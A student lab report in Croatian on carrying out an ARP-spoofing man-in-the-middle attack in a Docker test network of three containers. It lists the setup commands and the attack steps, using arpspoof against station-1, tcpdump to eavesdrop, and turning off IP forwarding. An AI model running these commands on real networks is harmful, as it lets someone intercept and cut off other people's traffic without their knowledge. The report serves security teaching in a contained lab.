# Laboratorijske vježbe (SRP)

## 1. laboratorijske vježbe

12.10.2021.

## Zadatak

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola.

Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container): 

1. station-1 
2. station-2
3. evil-station (napadač)

## Pokretanje mreže na lokalnom računalu

**Kloniranje repozitorija**

$ git clone https://github.com/mcagalj/SRP-2021-22

**Ulazak u novi direktorij**

$ cd SRP-2021-22/arp-spoofing/

- u direktoriju su se nalazile već gotove skripte start.sh i stop.sh za pokretanje i zaustavljanje virtualiziranog mrežnog scenarija što možemo provjeriti naredbom code .

## Naredbe i alati u Linuxu

**Pokretanje i zaustavljanje virtualiziranog mrežnog scenarija**

$ ./start.sh                                                                                                                                                      

$ ./stop.sh

**Pokretanje shella**

$ docker ps exec -it sh

**Provjera informacija (IP adrese i adrese mrežnog uređaja)**

$ ifconfig -a

- uz pomoć dobivenih informacija pratimo jesmo li uspješno izvršili napad

**Provjera nalazi li se station-2 na istoj mreži**

$ ping station-2

**Pokretanje shella u drugom kontejneru**

$ docker exec -it station-2 sh

**Ostvarivanje komunikacije između station-1 i station-2** 

$ netcat -lp 9000

- za ovakav način komunikacije treba znati IP adresu i port

$ netcat station-1 9000

**Pokretanje shella u trećem kontejneru (napadača)**

$ docker exec -it evil-station sh

## Napad na žrtvu

**Pokretanje napada**

$ arpspoof -t station-1 station-2

$ tcpdump

- sada pratimo razgovor između station-1 i station-2 bez njihova znanja

**Završetak napada**

$ echo 0 > /proc/sys/net/ipv4/ip_forward